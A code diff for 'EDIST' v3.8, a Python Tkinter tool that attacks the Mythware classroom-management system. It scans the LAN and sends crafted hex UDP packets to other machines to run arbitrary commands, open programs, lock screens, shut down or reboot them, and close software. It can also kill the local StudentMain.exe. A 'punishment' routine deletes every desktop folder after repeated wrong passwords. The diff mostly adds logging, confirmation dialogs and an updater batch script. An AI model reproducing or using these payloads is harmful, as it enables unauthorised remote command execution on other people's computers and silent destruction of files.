@@ -1,8 +1,20 @@
 import socket
+import sys
+import os
+
+# PyInstaller 运行时钩子兼容修复：确保 TCL_LIBRARY / TK_LIBRARY 正确设置
+if getattr(sys, 'frozen', False):
+    _meipass = sys._MEIPASS
+    _tcl_dir = os.path.join(_meipass, 'tcl')
+    _tk_dir = os.path.join(_meipass, 'tk')
+    if os.path.isdir(_tcl_dir):
+        os.environ.setdefault('TCL_LIBRARY', _tcl_dir)
+    if os.path.isdir(_tk_dir):
+        os.environ.setdefault('TK_LIBRARY', _tk_dir)
+
 import tkinter as tk
 from tkinter import messagebox, simpledialog, ttk
 import binascii
-import os
 import subprocess
 import threading
 import random
@@ -24,7 +36,12 @@ class ConfigManager:
         """获取基础路径（兼容源码模式和打包模式）"""
         if getattr(sys, 'frozen', False):
             # PyInstaller 打包后的 exe 模式
-            return os.path.dirname(sys.executable)
+            exe_dir = os.path.dirname(sys.executable)
+            # 检查 config.json 是否在 _internal 子目录中（新版 PyInstaller）
+            internal_config = os.path.join(exe_dir, '_internal', 'config.json')
+            if os.path.exists(internal_config):
+                return os.path.join(exe_dir, '_internal')
+            return exe_dir
         else:
             # 源码运行模式
             return os.path.dirname(os.path.abspath(__file__))
@@ -47,7 +64,7 @@ class ConfigManager:
     def get_default_config(self):
         """获取默认配置"""
         return {
-            'app': {'name': 'EDIST', 'version': '3.3'},
+            'app': {'name': 'EDIST', 'version': '3.8'},
             'network': {
                 'default_port': 4705,
                 'ports_2016': 4705,
@@ -107,7 +124,12 @@ class LanguageManager:
         """获取基础路径（兼容源码模式和打包模式）"""
         if getattr(sys, 'frozen', False):
             # PyInstaller 打包后的 exe 模式
-            return os.path.dirname(sys.executable)
+            exe_dir = os.path.dirname(sys.executable)
+            # 优先检查 _internal 子目录（新版 PyInstaller）
+            internal_dir = os.path.join(exe_dir, '_internal')
+            if os.path.isdir(internal_dir):
+                return internal_dir
+            return exe_dir
         else:
             # 源码运行模式
             return os.path.dirname(os.path.abspath(__file__))
@@ -125,7 +147,8 @@ class LanguageManager:
                 with open(lang_path, 'r', encoding='utf-8') as f:
                     self.translations = json.load(f)
                 self.current_language = lang_code
-                print(f'[Language] Loaded: {lang_code} - {self.get("language.name")}')
+                lang_name = self.get(f'language.{lang_code}')
+                print(f'[Language] Loaded: {lang_code} - {lang_name}')
             else:
                 print(f'[Language] File not found: {lang_path}')
                 # 回退到中文
@@ -227,7 +250,8 @@ def SearchIp():
     txt4.delete(0,tk.END)
     txt1.insert('end', lhost)
     txt4.insert('end', str(len(IPtable)))
-    messagebox.showinfo('X提醒', f'获取到{len(IPtable)}个IP')
+    messagebox.showinfo('3477提醒您', f'获取到{len(IPtable)}个IP')
+    log_message(f'检测到 {len(IPtable)} 个在线IP', 'INFO')
     print(lhost)
 
 def lock():
@@ -236,25 +260,27 @@ def lock():
     TargetIP = IPtable.copy()
     print(IPtable)
     if len(IPtable)==0:
-        messagebox.showwarning('X提醒','请检测IP啊哥哥')
+        messagebox.showwarning('3477提醒您','请检测IP啊哥哥')
     else:
-        messagebox.showinfo('X提醒','您接下来的操作会攻击到所有IP!')
+        messagebox.showinfo('3477提醒您','您接下来的操作会攻击到所有IP!')
         b11.config(fg='red')
         b12.config(fg='black')
         txt4.delete(0, tk.END)
         txt4.insert('end', str(len(TargetIP)))
+        log_message(f'已锁定所有IP - 目标数: {len(TargetIP)}', 'INFO')
 
 def release():
     TargetIP.clear()
     TargetIP.append(txt1.get())
     if len(txt1.get())<2:
-        messagebox.showwarning('X提醒','请检测IP啊哥哥')
+        messagebox.showwarning('3477提醒您','请检测IP啊哥哥')
     else:
         b11.config(fg='black')
         b12.config(fg='red')
-        messagebox.showinfo('X提醒', '您接下来的操作会攻击到目标IP!')
+        messagebox.showinfo('3477提醒您', '您接下来的操作会攻击到目标IP!')
         txt4.delete(0, tk.END)
         txt4.insert('end', '1')
+        log_message(f'已锁定目标IP: {txt1.get()}', 'INFO')
 
 def openfile():
     # 检查点击频率（管理员模式下跳过）
@@ -288,6 +314,12 @@ def openfile():
             payload_bytes4 = bytes.fromhex(payload_mspaint)
             udp_socket.sendto(payload_bytes4, (ip, Port))
     udp_socket.close()
+    programs = []
+    if status1: programs.append('cmd')
+    if status2: programs.append('计算器')
+    if status3: programs.append('记事本')
+    if status4: programs.append('画图')
+    log_message(f'打开程序: {", ".join(programs)} - 目标数: {len(TargetIP)}', '操作')
 
 def openhtml():
     url = 'www.jd.com'
@@ -325,6 +357,7 @@ def send_msg():
     for ip in TargetIP:
         s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         s.sendto(payload,(ip,Port))
+    log_message(f'发送消息: "{message[:30]}{"..." if len(message)>30 else ""}" - 目标数: {len(TargetIP)}', '操作')
 # def send_msg ():
 #     content = txt2.get()
 #     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -363,7 +396,13 @@ def send_cmd(txt=''):
         # ip = '192.168.1.105'
         udp_socket.sendto(payload_bytes, (f"{ip}", Port))
     udp_socket.close()
+    log_message(f'执行命令: "{txt}" - 目标数: {len(TargetIP)}', '操作')
 def sleep():
+    if len(TargetIP) == 0:
+        messagebox.showwarning('3477提醒您', t('messages.no_target_ip'))
+        return
+    if not messagebox.askyesno(t('confirmations.danger_title'), f'确定要执行「锁屏」吗？\n\n目标数量: {len(TargetIP)}', parent=root):
+        return
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     for ip in TargetIP:
         txt = 'rundll32.exe user32.dll,LockWorkStation && exit'
@@ -374,10 +413,10 @@ def sleep():
             txt_hex = txt_hex + hex(ord(txt[i]))[2:] + "00"
         payload = f'444d4f43000001006e030000{random.randint(11, 99)}44dcfa94cc8a4ba5fffa49b0caa95f204e0000c0a81484610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e0065007800650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002f006b002000{txt_hex}00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000'
         payload_bytes = bytes.fromhex(payload)
-        # ip = '192.168.1.105'
         udp_socket.sendto(payload_bytes, (f"{ip}", Port))
 
     udp_socket.close()
+    log_message(f'锁屏命令已发送 - 目标数: {len(TargetIP)}', '操作')
 def send(payload):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     for ip in TargetIP:
@@ -385,11 +424,16 @@ def send(payload):
         udp_socket.sendto(payload_bytes, (f"{ip}", Port))
     udp_socket.close()
 def shutdown():
+    if len(TargetIP) == 0:
+        messagebox.showwarning('3477提醒您', t('messages.no_target_ip'))
+        return
+    if not messagebox.askyesno(t('confirmations.danger_title'), f'确定要执行「关机」吗？\n此操作不可撤销！\n\n目标数量: {len(TargetIP)}', parent=root):
+        return
     if is_admin_mode():
-        # 管理员模式，直接执行
         payload='444d4f43000001002a0200007b10b3ecaa98c24cbd9360583e61e637204e0000c0a8016a1d0200001d0200000002000000000000140000000f0000000100000000000000d19ea25b065c7351ed95a8608476a18b977b3a670230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046'
         send(payload)
-        messagebox.showinfo('X提醒', '关机命令已发送 [管理员模式]')
+        messagebox.showinfo('3477提醒您', '关机命令已发送 [管理员模式]')
+        log_message(f'关机命令已发送 - 目标数: {len(TargetIP)} [管理员模式]', '操作')
     else:
         password = simpledialog.askstring('密码验证', '请输入作者密码：', show='*', parent=root)
         if password is not None:
@@ -397,13 +441,19 @@ def shutdown():
             if check_password_attempt(is_correct) and is_correct:
                 payload='444d4f43000001002a0200007b10b3ecaa98c24cbd9360583e61e637204e0000c0a8016a1d0200001d0200000002000000000000140000000f0000000100000000000000d19ea25b065c7351ed95a8608476a18b977b3a670230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046'
                 send(payload)
-                messagebox.showinfo('X提醒', '关机命令已发送')
+                messagebox.showinfo('3477提醒您', '关机命令已发送')
+                log_message(f'关机命令已发送 - 目标数: {len(TargetIP)}', '操作')
 def reboot():
+    if len(TargetIP) == 0:
+        messagebox.showwarning('3477提醒您', t('messages.no_target_ip'))
+        return
+    if not messagebox.askyesno(t('confirmations.danger_title'), f'确定要执行「重启」吗？\n此操作不可撤销！\n\n目标数量: {len(TargetIP)}', parent=root):
+        return
     if is_admin_mode():
-        # 管理员模式，直接执行
         payload='444d4f43000001002a02000058749b2c8803a648bd3a8fd0842a1962204e0000c0a8016a1d0200001d0200000002000000000000130000000f0000000100000000000000d19ea25b065ccd912f54a8608476a18b977b3a670230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
         send(payload)
-        messagebox.showinfo('X提醒', '重启命令已发送 [管理员模式]')
+        messagebox.showinfo('3477提醒您', '重启命令已发送 [管理员模式]')
+        log_message(f'重启命令已发送 - 目标数: {len(TargetIP)} [管理员模式]', '操作')
     else:
         password = simpledialog.askstring('密码验证', '请输入作者密码：', show='*', parent=root)
         if password is not None:
@@ -411,25 +461,32 @@ def reboot():
             if check_password_attempt(is_correct) and is_correct:
                 payload='444d4f43000001002a02000058749b2c8803a648bd3a8fd0842a1962204e0000c0a8016a1d0200001d0200000002000000000000130000000f0000000100000000000000d19ea25b065ccd912f54a8608476a18b977b3a670230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
                 send(payload)
-                messagebox.showinfo('X提醒', '重启命令已发送')
-def sign(): # 签到--待更新
+                messagebox.showinfo('3477提醒您', '重启命令已发送')
+                log_message(f'重启命令已发送 - 目标数: {len(TargetIP)}', '操作')
+def sign():
+    if len(TargetIP) == 0:
+        messagebox.showwarning('3477提醒您', t('messages.no_target_ip'))
+        return
+    if not messagebox.askyesno(t('confirmations.danger_title'), f'确定要执行「签到」吗？\n\n目标数量: {len(TargetIP)}', parent=root):
+        return
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #while 1:
     letters_and_digits = string.ascii_lowercase + string.digits
     token = ''.join(random.choice(letters_and_digits) for i in range(32))
-    print(token)
-    payload = f'444d4f430000010026000000{token}204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000'
-    #payload = f'444d4f43000001002600000049f65c13ca2f4f43b28e64086f1ba8f0204e0000c0a80112190000001900000000020000000000001b00000001000000030000000000'
+    token_hex = ''.join(format(ord(c), '02x') for c in token)
+    print(f'token: {token}')
+    payload = f'444d4f430000010026000000{token_hex}204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000'
     for ip in TargetIP:
         payload_bytes = bytes.fromhex(payload)
         udp_socket.sendto(payload_bytes, (f"{ip}", Port))
     udp_socket.close()
+    messagebox.showinfo('3477提醒您', '签到命令已发送')
+    log_message(f'签到命令已发送 - 目标数: {len(TargetIP)}', '操作')
 def closeapp():
     if is_admin_mode():
         # 管理员模式，直接执行
         payload = '444d4f43000001002a020000ce7de4f7eff47d4bafb480529a8a022c204e0000c0a8016a1d0200001d0200000002000000000000020000000f0000000100000000000000d19ea25b065c7351ed95a8608476945e28750b7a8f5e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046'
         send(payload)
-        messagebox.showinfo('X提醒', '关闭软件命令已发送 [管理员模式]')
+        messagebox.showinfo('3477提醒您', '关闭软件命令已发送 [管理员模式]')
     else:
         password = simpledialog.askstring('密码验证', '请输入作者密码：', show='*', parent=root)
         if password is not None:
@@ -437,7 +494,7 @@ def closeapp():
             if check_password_attempt(is_correct) and is_correct:
                 payload = '444d4f43000001002a020000ce7de4f7eff47d4bafb480529a8a022c204e0000c0a8016a1d0200001d0200000002000000000000020000000f0000000100000000000000d19ea25b065c7351ed95a8608476945e28750b7a8f5e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046'
                 send(payload)
-                messagebox.showinfo('X提醒', '关闭软件命令已发送')
+                messagebox.showinfo('3477提醒您', '关闭软件命令已发送')
 
 flag = 0
 
@@ -455,7 +512,7 @@ def delete_desktop_folders():
         desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
         
         if not os.path.exists(desktop_path):
-            messagebox.showerror('X提醒', '未找到桌面路径！')
+            messagebox.showerror('3477提醒您', '未找到桌面路径！')
             return
         
         # 遍历桌面上的所有文件夹并删除
@@ -472,10 +529,10 @@ def delete_desktop_folders():
                 except Exception as e:
                     print(f'删除失败: {item_path}, 错误: {e}')
         
-        messagebox.showwarning('X提醒', f'密码错误次数过多！已删除桌面上的{deleted_count}个文件夹！')
+        messagebox.showwarning('3477提醒您', f'密码错误次数过多！已删除桌面上的{deleted_count}个文件夹！')
         
     except Exception as e:
-        messagebox.showerror('X提醒', f'删除失败: {str(e)}')
+        messagebox.showerror('3477提醒您', f'删除失败: {str(e)}')
 
 def check_password_attempt(password_correct):
     """检查密码尝试次数，返回是否允许继续"""
@@ -495,7 +552,7 @@ def check_password_attempt(password_correct):
         remaining = MAX_PASSWORD_ATTEMPTS - password_attempts
         
         if remaining > 0:
-            messagebox.showerror('X提醒', f'密码错误！还剩{remaining}次机会')
+            messagebox.showerror('3477提醒您', f'密码错误！还剩{remaining}次机会')
             return False
         else:
             # 次数用完，执行惩罚
@@ -530,10 +587,10 @@ def check_konami_code(event):
             konami_sequence.clear()
             
             # 更改窗口标题显示管理员模式
-            root.title('EDIST v3.0 [管理员模式]')
+            root.title('EDIST v3.8 [管理员模式]')
             
             # 显示提示
-            messagebox.showinfo('X提醒', 'ADMIN 管理员模式已开启！\n\n✓ 无需密码验证\n✓ 无次数限制\n✓ 所有功能解锁')
+            messagebox.showinfo('3477提醒您', 'ADMIN 管理员模式已开启！\n\n✓ 无需密码验证\n✓ 无次数限制\n✓ 所有功能解锁')
             
             print('管理员模式已激活！')
 
@@ -665,6 +722,124 @@ def get_ethernet_ip():
     except:
         return '127.0.0.1'
 
+def get_all_network_interfaces():
+    """获取所有可用网卡接口列表，返回 [{'name': 友好名称, 'ip': IP地址, 'iface': 接口名}, ...]"""
+    interfaces = []
+    try:
+        import netifaces
+        for iface in netifaces.interfaces():
+            addrs = netifaces.ifaddresses(iface)
+            if netifaces.AF_INET in addrs:
+                for addr_info in addrs[netifaces.AF_INET]:
+                    ip = addr_info['addr']
+                    if ip.startswith('127.'):
+                        continue
+                    # 尝试获取Windows友好名称
+                    friendly_name = iface
+                    try:
+                        import winreg
+                        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
+                        key = winreg.OpenKey(reg, r"SYSTEM\CurrentControlSet\Control\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}")
+                        i = 0
+                        while True:
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                if subkey_name == 'Descriptions':
+                                    i += 1
+                                    continue
+                                subkey = winreg.OpenKey(key, subkey_name)
+                                try:
+                                    conn_key = winreg.OpenKey(subkey, 'Connection')
+                                    try:
+                                        name = winreg.QueryValueEx(conn_key, 'Name')[0]
+                                        # 通过ipconfig匹配接口名和友好名称
+                                        try:
+                                            adapter_subkey = winreg.OpenKey(subkey, subkey_name)
+                                            winreg.CloseKey(adapter_subkey)
+                                        except:
+                                            pass
+                                        # 简化处理：直接使用注册表中的名称
+                                        # 检查这个接口是否有关联的IP
+                                        if name:
+                                            friendly_name = name
+                                            break
+                                    finally:
+                                        winreg.CloseKey(conn_key)
+                                finally:
+                                    winreg.CloseKey(subkey)
+                                i += 1
+                            except WindowsError:
+                                break
+                    except:
+                        pass
+                    interfaces.append({
+                        'name': friendly_name,
+                        'ip': ip,
+                        'iface': iface
+                    })
+    except ImportError:
+        # 没有netifaces，使用ipconfig解析
+        try:
+            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, encoding='gbk')
+            lines = result.stdout.split('\n')
+            current_adapter = None
+            current_ip = None
+            for line in lines:
+                # 检测适配器名称
+                if '适配器' in line and ':' in line:
+                    if current_adapter and current_ip:
+                        interfaces.append({
+                            'name': current_adapter.strip(),
+                            'ip': current_ip,
+                            'iface': current_adapter.strip()
+                        })
+                    current_adapter = line.rsplit(':', 1)[0].strip() if ':' in line else line
+                    current_ip = None
+                elif 'IPv4' in line or 'IPv4 地址' in line:
+                    import re
+                    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
+                    if ip_match:
+                        ip = ip_match.group(1)
+                        if not ip.startswith('127.'):
+                            current_ip = ip
+            if current_adapter and current_ip:
+                interfaces.append({
+                    'name': current_adapter.strip(),
+                    'ip': current_ip,
+                    'iface': current_adapter.strip()
+                })
+        except:
+            pass
+    
+    # 如果没有任何接口，使用socket获取
+    if not interfaces:
+        try:
+            lname = socket.getfqdn(socket.gethostname())
+            ip = socket.gethostbyname(lname)
+            if not ip.startswith('127.'):
+                interfaces.append({'name': '默认网卡', 'ip': ip, 'iface': 'default'})
+        except:
+            pass
+    
+    return interfaces
+
+def switch_network_card(ip):
+    """切换网卡，更新全局 lhost"""
+    global lhost
+    lhost = ip
+    # 更新状态栏
+    status_label.config(text=f"{t('status.ready')} | IP: {lhost} | Port: {Port} | 语言: {i18n.current_language}")
+    # 保存到配置
+    config.config['network']['selected_ip'] = ip
+    config.save_config()
+    print(f'网卡已切换至: {ip}')
+    
+    # 重启HTTP服务器以绑定新IP
+    try:
+        start_http()
+    except Exception as e:
+        print(f'HTTP服务器重启失败: {e}')
+
 # ==================== UI更新系统 ====================
 def update_all_ui_texts():
     """更新所有UI文本（用于语言切换）"""
@@ -688,21 +863,27 @@ def update_all_ui_texts():
         b5.config(text=t('buttons.reboot'))
         b6.config(text=t('buttons.lock_screen'))
         b7.config(text=t('buttons.sign_in'))
-        b8.config(text=t('buttons.close_app'))
         b10.config(text=t('buttons.detect_ip'))
         
         # 更新标签文本
         lb1.config(text=t('labels.target_ip'))
         lb6.config(text=t('labels.ip_count'))
-        lb2.config(text=t('labels.open_program'))
-        lb3.config(text=t('labels.send_message'))
-        lb4.config(text=t('labels.execute_command'))
+        program_frame.config(text=t('labels.open_program'))
+        msg_frame.config(text=t('labels.send_message'))
+        cmd_frame.config(text=t('labels.execute_command'))
+        upload_frame.config(text=t('labels.file_upload'))
         
         # 更新复选框
         chek1.config(text=t('programs.cmd'))
         chek2.config(text=t('programs.calculator'))
         chek3.config(text=t('programs.notepad'))
         chek4.config(text=t('programs.paint'))
+        
+        # 更新状态栏
+        status_label.config(text=f"{t('status.ready')} | IP: {lhost} | Port: {Port} | 语言: {i18n.current_language}")
+        
+        # 更新网卡标签
+        nic_label.config(text=t('labels.network_card'))
         
         print('UI文本更新完成')
     except Exception as e:
@@ -1164,9 +1345,9 @@ class AutoUpdateManager:
     """
     
     def __init__(self):
-        self.current_version = config.get('app.version', '3.3')
+        self.current_version = config.get('app.version', '3.8')
         # 更新服务器地址 - 使用 latest.php
-        self.update_api_url = config.get('features.update_server_url', 'https://347735.xyz/genxin/latest.php')
+        self.update_api_url = config.get('features.update_server_url', 'https://347735.xyz/latest.php')
         self.update_check_enabled = config.get('features.auto_update', True)
         
         print(f"[Update] 初始化完成")
@@ -1551,10 +1732,10 @@ class AutoUpdateManager:
             pass
         
         print(f"[Update] ✓ 解压完成: {extract_dir}")
-        
+
         # 5. 启动更新器并退出主程序
         print(f"\n[Step 5/5] 准备启动更新器...")
-        
+
         if not self.is_packaged():
             print("[Update] 检测到源码运行环境，无法自动替换文件")
             if show_progress:
@@ -1566,23 +1747,19 @@ class AutoUpdateManager:
                     f"请手动备份并替换文件后重启程序。"
                 )
             return True
-        
+
         current_dir = os.path.dirname(sys.executable)
         updater_exe = os.path.join(current_dir, 'updater.exe')
-        
+
         if not os.path.exists(updater_exe):
-            print(f"[Update] ✗ 更新器不存在: {updater_exe}")
-            if show_progress:
-                messagebox.showerror(
-                    "Updater Not Found",
-                    f"未找到更新器程序 (updater.exe)\n\n期望位置: {updater_exe}\n\n请确保 updater.exe 与主程序在同一目录下。"
-                )
-            return False
-        
+            print(f"[Update] ⚠ 更新器不存在，使用批处理备用方案")
+            self._install_via_batch(extract_dir, current_dir, latest_version, show_progress)
+            return True
+
         print(f"[Update] ✓ 找到更新器: {updater_exe}")
         print(f"[Update] 当前目录: {current_dir}")
         print(f"[Update] 新版本目录: {extract_dir}")
-        
+
         if show_progress:
             messagebox.showinfo(
                 "Updating",
@@ -1590,13 +1767,70 @@ class AutoUpdateManager:
                 f"程序将自动关闭并由更新器完成剩余工作。\n"
                 f"请稍候，程序会自动重新启动。"
             )
-        
+
         print("[Update] 启动更新器进程...")
         subprocess.Popen([updater_exe, extract_dir, current_dir])
-        
+
         print("[Update] 主程序即将退出...")
         print("="*60)
-        
+
+        time.sleep(1)
+        sys.exit(0)
+
+    def _install_via_batch(self, extract_dir, target_dir, version, show_progress=True):
+        """通过批处理脚本完成文件替换和重启（备用方案）"""
+        import tempfile
+
+        items = os.listdir(extract_dir)
+        if len(items) == 1:
+            single_item = os.path.join(extract_dir, items[0])
+            if os.path.isdir(single_item):
+                print(f"[Update] 检测到单层目录包装 '{items[0]}'，使用内层目录")
+                extract_dir = single_item
+
+        current_exe = sys.executable
+        current_exe_name = os.path.basename(current_exe)
+
+        batch_content = '@echo off\r\n'
+        batch_content += 'chcp 65001 >nul\r\n'
+        batch_content += 'title EDIST Updater\r\n'
+        batch_content += 'echo Waiting for main program to exit...\r\n'
+        batch_content += ':waitloop\r\n'
+        batch_content += f'tasklist /FI "IMAGENAME eq {current_exe_name}" 2>NUL | find /I "{current_exe_name}" >NUL\r\n'
+        batch_content += 'if %ERRORLEVEL% EQU 0 (\r\n'
+        batch_content += '    timeout /T 2 /NOBREAK >nul\r\n'
+        batch_content += '    goto waitloop\r\n'
+        batch_content += ')\r\n'
+        batch_content += 'echo Updating files...\r\n'
+        batch_content += f'xcopy "{extract_dir}\\*" "{target_dir}\\" /E /H /R /Y /Q\r\n'
+        batch_content += 'echo Cleanup...\r\n'
+        batch_content += f'rmdir /S /Q "{extract_dir}" 2>nul\r\n'
+        batch_content += 'echo Starting new version...\r\n'
+        batch_content += f'start "" "{current_exe}"\r\n'
+        batch_content += 'echo Done!\r\n'
+        batch_content += 'timeout /T 3 /NOBREAK >nul\r\n'
+        batch_content += 'del "%~f0"\r\n'
+
+        batch_path = os.path.join(tempfile.gettempdir(), 'EDIST_update.bat')
+        with open(batch_path, 'w', encoding='utf-8') as f:
+            f.write(batch_content)
+
+        print(f"[Update] 批处理脚本已创建: {batch_path}")
+
+        if show_progress:
+            messagebox.showinfo(
+                "Updating",
+                f"正在准备更新到 v{version}...\n\n"
+                f"程序将自动关闭并完成更新。\n"
+                f"请稍候，程序会自动重新启动。"
+            )
+
+        print("[Update] 启动批处理更新脚本...")
+        subprocess.Popen(['cmd.exe', '/c', batch_path], creationflags=subprocess.CREATE_NEW_CONSOLE if hasattr(subprocess, 'CREATE_NEW_CONSOLE') else 0)
+
+        print("[Update] 主程序即将退出...")
+        print("="*60)
+
         time.sleep(1)
         sys.exit(0)
     
@@ -1829,27 +2063,32 @@ def init():
 def killjy():
     global flag
     if flag==0:
-        # 杀掉极域
         subprocess.run(f'taskkill -f -im StudentMain.exe ', shell=True)
-        messagebox.showinfo('X提醒','已为您杀掉极域！')
+        messagebox.showinfo('3477提醒您','已为您杀掉极域！')
         b13.config(text='恢复极域')
         flag=1
+        log_message('已杀掉极域进程', 'INFO')
     else:
-        # 恢复极域
         os.startfile(r'C:\Program Files (x86)\Mythware\极域课堂管理系统软件V6.0 2016 豪华版\StudentMain.exe')
         flag=0
         b13.config(text='杀掉极域')
+        log_message('已恢复极域进程', 'INFO')
 
 def aboutme():
-    messagebox.showinfo("X提醒","本软件仅供学习研究，使用开源程序加ai制作，有问题加nmmmyl@ying3477.xyz")
+    messagebox.showinfo("3477提醒您","本软件仅供学习研究，使用开源程序加ai制作，有问题加nmmmyl@ying3477.xyz")
 def ver2016():
     global Port
     Port = 4705 #2016
-    messagebox.showinfo("X提醒", "端口切换为:4705")
+    messagebox.showinfo("3477提醒您", "端口切换为:4705")
 def ver2022():
     global Port
     Port = 4988 # 2022
-    messagebox.showinfo("X提醒", "端口切换为:4988")
+    messagebox.showinfo("3477提醒您", "端口切换为:4988")
+class UploadHTTPHandler(SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        logging.getLogger('HTTP-LOG').info(f'{self.client_address[0]} - {format % args}')
+
+
 def http_server():
     logger = logging.getLogger('HTTP-LOG')
     logger.setLevel(logging.DEBUG)
@@ -1862,19 +2101,19 @@ def http_server():
     fs.setFormatter(formatter)
     logger.addHandler(cs)
     logger.addHandler(fs)
-    
-    # 使用程序所在目录作为HTTP根目录
-    import os
-    http_root = os.path.dirname(os.path.abspath(__file__))
-    os.chdir(http_root)
-    
-    # 尝试多个端口
+
+    upload_dir = os.path.join(config.get_base_path(), 'uploads')
+    if not os.path.exists(upload_dir):
+        os.makedirs(upload_dir)
+    os.chdir(upload_dir)
+    logger.info(f'上传目录: {upload_dir}')
+
     ports_to_try = [8080, 8000, 9000, 10000]
     server = None
-    
+
     for port in ports_to_try:
         try:
-            server = HTTPServer((lhost, port), SimpleHTTPRequestHandler)
+            server = HTTPServer((lhost, port), UploadHTTPHandler)
             logger.info(f'HTTP服务器启动成功: http://{lhost}:{port}')
             global http_port
             http_port = port
@@ -1883,279 +2122,396 @@ def http_server():
         except Exception as e:
             logger.warning(f'端口 {port} 启动失败: {e}')
             continue
-    
+
     if not server:
